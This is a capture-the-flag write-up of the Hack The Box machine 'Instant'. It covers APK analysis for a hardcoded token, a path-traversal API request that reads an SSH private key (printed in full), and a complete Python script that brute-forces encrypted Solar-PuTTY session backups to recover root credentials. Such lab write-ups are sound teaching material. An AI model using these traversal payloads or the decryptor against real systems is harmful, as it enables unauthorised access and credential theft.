---
layaout: post
image: /assets/instant/instant.png
title: Instant Write Up HTB
date: 02-03-2025
categories: [Write ups]
tag: [Reverse Engineering,API Exploitation,Arbitrary File Read,Mobile Application,APK Analysis,Encryption Cracking,Hash Cracking,Solar-PuTTY,Linux,Privilege Escalation,Medium Difficulty]
excerpt: "Instant on Hack The Box is a medium-difficulty machine that focuses on reverse engineering a mobile application, exploiting API endpoints, and cracking encrypted hashes and files. The initial exploitation involves analyzing an APK to extract sensitive information, including a hardcoded authorization token. Then, players exploit an API endpoint vulnerable to Arbitrary File Read to access critical files. Finally, the machine is fully compromised by decrypting and analyzing encrypted session data from Solar-PuTTY.

This machine is ideal for those looking to learn about mobile app analysis, API exploitation, and cracking encrypted data in a controlled environment."
---
![img-description](/assets/instant/instant.png)

Instant on Hack The Box is a medium-difficulty machine that focuses on reverse engineering a mobile application, exploiting API endpoints, and cracking encrypted hashes and files. The initial exploitation involves analyzing an APK to extract sensitive information, including a hardcoded authorization token. Then, players exploit an API endpoint vulnerable to Arbitrary File Read to access critical files. Finally, the machine is fully compromised by decrypting and analyzing encrypted session data from Solar-PuTTY.

This machine is ideal for those looking to learn about mobile app analysis, API exploitation, and cracking encrypted data in a controlled environment.

## ENUMERATION
---
First, we run an Nmap scan:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.37 -oG allPorts
```

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.37 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-01 14:35 CET
Initiating SYN Stealth Scan at 14:35
Scanning 10.10.11.37 [65535 ports]
Discovered open port 22/tcp on 10.10.11.37
Discovered open port 80/tcp on 10.10.11.37
Completed SYN Stealth Scan at 14:35, 12.11s elapsed (65535 total ports)
Nmap scan report for 10.10.11.37
Host is up, received user-set (0.043s latency).
Scanned at 2025-02-01 14:35:04 CET for 12s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 12.22 seconds
           Raw packets sent: 65770 (2.894MB) | Rcvd: 65535 (2.621MB)
```

Since ports 80 and 22 are open, port 80 suggests an active web service. We then add the IP and domain to `/etc/hosts`:

```bash
sudo vim /etc/hosts
```

And append the IP with its corresponding domain.


## FOOTHOLD
---
Next, we inspect the website

![Texto alternativo](/assets/instant/Screenshot%202025-02-01%20150738.jpg)

The webpage seems uninteresting even after enumerating subdomains and directories. However, clicking on **DOWNLOAD NOW** downloads a `.apk` file. We can analyze this file using `jadx`:

```bash
jadx-gui 
```

After opening the `.apk`, we find an **AUTHORIZATION BEARER token** and a subdomain. The critical part is the token:

![Texto alternativo](/assets/instant/Screenshot%202025-02-01%20151012.jpg)

Further investigation in the file `Resources/res/xml/network_security_config.xml` reveals:

![Texto alternativo](/assets/instant/Screenshot%202025-02-01%20151837.jpg)

We add `swagger-ui.instant.htb` to `/etc/hosts` and explore the website:

![Texto alternativo](/assets/instant/Screenshot%202025-02-01%20152136.jpg)

This suggests we can access the system via a `curl` request:

```bash
curl -X GET "http://swagger-ui.instant.htb/api/v1/admin/read/log?log_file_name=..%2F.ssh%2Fid_rsa" -H  "accept: application/json" -H  "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA"
```

This request provides an **SSH private key**.

```bash
curl -X GET "http://swagger-ui.instant.htb/api/v1/admin/read/log?log_file_name=..%2F.ssh%2Fid_rsa" -H  "accept: application/json" -H  "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA"
{"/home/shirohige/logs/../.ssh/id_rsa":["-----BEGIN OPENSSH PRIVATE KEY-----\n","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\n","-----END OPENSSH PRIVATE KEY-----\n"],"Status":201}
```
Once we have the SSH key, we notice that it contains characters such as `\n`, `,`, and `""`. To remove these, we copy only the SSH key without `"-----BEGIN OPENSSH PRIVATE KEY-----\n",` or `,"-----END OPENSSH PRIVATE KEY-----\n"],"Status":201}` like this.

```bash
"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\n"
```

Once we have this, we save it to a .txt file. In this case, I'll save it as clave.txt and proceed with the following commands:

First, we remove the `\n` characters with the following command:

```bash
sed 's/\\n//g' clave.txt > clave_limpia.txt
```

Now, let's execute another command, which serves to remove the commas (`,`) and the double quotes (`"`). The command below will process the `clave_limpia.txt` file and output the cleaned result to `clave_lim.txt`:

```bash
sed 's/[",]//g' clave_limpia.txt > clave_lim.txt
```

Explanation:
- `sed`: Stream editor that allows editing text on the fly.
- `s/[",]//g`: This part tells `sed` to search for commas (`,`) and double quotes (`"`) in the file and replace them with nothing (`//`). The `g` flag ensures that this replacement happens globally across each line in the file.

Finally, we add the necessary headers (`-----BEGIN OPENSSH PRIVATE KEY-----`) and footers (`-----END OPENSSH PRIVATE KEY-----`), along with a line break every 70 characters for proper formatting:

```bash
echo "-----BEGIN OPENSSH PRIVATE KEY-----" > id_rsa
cat clave_lim.txt | fold -w 70 >> id_rsa
echo "-----END OPENSSH PRIVATE KEY-----" >> id_rsa
```

Explanation:
- `echo`: Used to print text to the file. In this case, it adds the necessary headers and footers for the OpenSSH private key.
- `fold -w 70`: Wraps each line to ensure no line exceeds 70 characters in length, which is required for OpenSSH private key formatting.
- `>>`: Appends the output to the file (`id_rsa`), rather than overwriting it.

Once everything is set, we make the private key file secure by adjusting its permissions:

```bash
chmod 600 id_rsa
```

Explanation:
- `chmod 600`: This command restricts access to the file so that only the file's owner can read and write to it, ensuring that the private key is secure.


Paste the SSH key and set proper permissions:

```bash
chmod 600 id_rsa
```

Then, connect via SSH:

```bash
ssh shirohige@instant.htb -i id_rsa
```

We can now retrieve the user flag:

```bash
shirohige@instant:~$ cat user.txt
4da76423903bb0###################
```


## PRIVILEGE ESCALATION
---

Navigating to `/opt/backups/Solar-PuTTY`, we find `session-backup.dat`, which seems interesting. We transfer it to our local machine using a Python server:

```bash
shirohige@instant:/opt/backups/Solar-PuTTY$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

On our local machine, we use `wget`:

```bash
wget http://10.10.11.37:8000/sessions-backup.dat
```

### Extracting Credentials from a Solar-PuTTY Backup


To retrieve the information stored in the `.dat` file, we need a script that can decrypt the saved credentials. The following Python script accomplishes this.

### Decryption Script

```python
import argparse
import base64
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import json
import sys
from typing import List, Tuple

def decrypt(password: str, ciphertext: str) -> str:
    try:
        # Decode the base64 encoded ciphertext
        array = base64.b64decode(ciphertext)
        salt = array[:24]
        iv = array[24:32]
        encrypted_data = array[32:]

        # Derive the key from the password using PBKDF2
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA1(),
            length=24,  # Triple DES key size
            salt=salt,
            iterations=1000,
            backend=default_backend()
        )
        key = kdf.derive(password.encode())

        # Create the cipher and decrypt the data
        cipher = Cipher(algorithms.TripleDES(key), modes.CBC(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        
        decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()

        data = ''.join(chr(c) for c in decrypted_data if chr(c).isascii())
        return data

    except Exception as e:
        print(f'Error: {e}')

def decrypt_wrapper(passwords: List[str], cipher: [str]) -> Tuple[str, str]: # type: ignore
    for i, password in enumerate(passwords):
        password: str  = password.strip()
        decrypted: str = decrypt(password, cipher)
        if decrypted and 'Credentials' in decrypted:
            print(f"✔ Correct password found on line {i}:  {password}")
            return (decrypted, password)
        else:
            print(f"❌ Password={password} is incorrect!")

 
def debug_decrypted_payload(decrypted: str):
    '''
    Useful to debug any unexpected bytes.
    '''
    import base64
    encoded_bytes = decrypted.encode("utf8")
    base64_bytes = base64.b64encode(encoded_bytes)
    base64_string = base64_bytes.decode("utf8")
    print(encoded_bytes)
    print(base64_string)
    

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Decrypt Solar-PuTTY session using a password or wordlist.')
    parser.add_argument('session', help='Path to the Solar-PuTTY session (.dat) file.')
    parser.add_argument('-wl', '--wordlist', help='Path to the wordlist file (optional).', nargs='?')
    parser.add_argument('-p', '--password', help='Password to use for decryption (optional).', nargs='?')

    args = parser.parse_args()

    if len(sys.argv) != 4:
        print(sys.argv)
        print("Usage: python SolarPuttyDecryptor.py <session_file> -wl <wordlist> or -p <password>")
        exit(1)

    with open(args.session, 'r', encoding='UTF8') as f:
        ciphertext: str = f.read()

    if args.password:
        decrypted, password = decrypt_wrapper([args.password], ciphertext)
    elif args.wordlist:
        with open(args.wordlist, 'r', encoding='UTF8') as passwords:
            decrypted, password = decrypt_wrapper(passwords, ciphertext)
    else:
        parser.print_help()
        print("Error: Either a password or a wordlist must be provided.")
        exit(2)
 
    try:
        # Some gibberish could exist in beginning.
        cleaned_up_decrypted: str = decrypted[decrypted.index('['):]
        fixed_decrypted: str = '{"Sessions":' + cleaned_up_decrypted
        
        # Some gibberish bytes could exist at end. Part of the fun...
        fixed_decrypted = fixed_decrypted.replace("\\","_").replace(b'\x01'.decode('UTF8'), '')
        decrypted_json: str = json.loads(fixed_decrypted)
        print('🚀🚀🚀🚀🚀')

        print(json.dumps(decrypted_json, indent=4))
    except json.JSONDecodeError as e:
        print("💀 Invalid JSON:", e)
        print(decrypted)
        exit(3)
```

### Credits
[Original repository](https://github.com/Wind010/SolarPuttyDecryptor/tree/main)

### Running the Script

To execute the script, use the following command:

```bash
python3 SolarPuttyDecryptor.py -wl /usr/share/wordlists/rockyou.txt sessions-backup.dat
```

Example output:

```bash
python3 SolarPuttyDecryptor.py -wl /usr/share/wordlists/rockyou.txt sessions-backup.dat
❌ Password=alexis is incorrect!
❌ Password=jesus is incorrect!
✔ Correct password found on line 3:  estre###
🚀🚀🚀🚀🚀
{
    "Sessions": [
        {
            "Id": "066894ee-635c-4578-86d0-d36d4838115b",
            "Ip": "10.10.11.37",
            "Port": 22,
            "ConnectionType": 1,
            "SessionName": "Instant",
            "Authentication": 0,
            "CredentialsID": "452ed919-530e-419b-b721-da76cbe8ed04",
            "AuthenticateScript": "00000000-0000-0000-0000-000000000000",
            "LastTimeOpen": "0001-01-01T00:00:00",
            "OpenCounter": 1,
            "SerialLine": null,
            "Speed": 0,
            "Color": "#FF176998",
            "TelnetConnectionWaitSeconds": 1,
            "LoggingEnabled": false,
            "RemoteDirectory": ""
        }
    ],
    "Credentials": [
        {
            "Id": "452ed919-530e-419b-b721-da76cbe8ed04",
            "CredentialsName": "instant-root",
            "Username": "root",
            "Password": "12**24nzC!r0c%q12",
            "PrivateKeyPath": "",
            "Passphrase": "",
            "PrivateKeyContent": null
        }
    ],
    "AuthScript": [],
    "Groups": [],
    "Tunnels": [],
    "LogsFolderDestination": "C:__ProgramData__SolarWinds__Logs__Solar-PuTTY__SessionLogs"
}
```

### Gaining Root Access

Now, use the retrieved credentials to switch to the root user:

```bash
su root
```

```bash
shirohige@instant:/opt/backups/Solar-PuTTY$ su root
Password: 
root@instant:/opt/backups/Solar-PuTTY# ls
sessions-backup.dat
root@instant:/opt/backups/Solar-PuTTY# cd /root
root@instant:~# ls
root.txt
root@instant:~# cat root.txt
4a7df3633a330c################
```

We already have both flags!
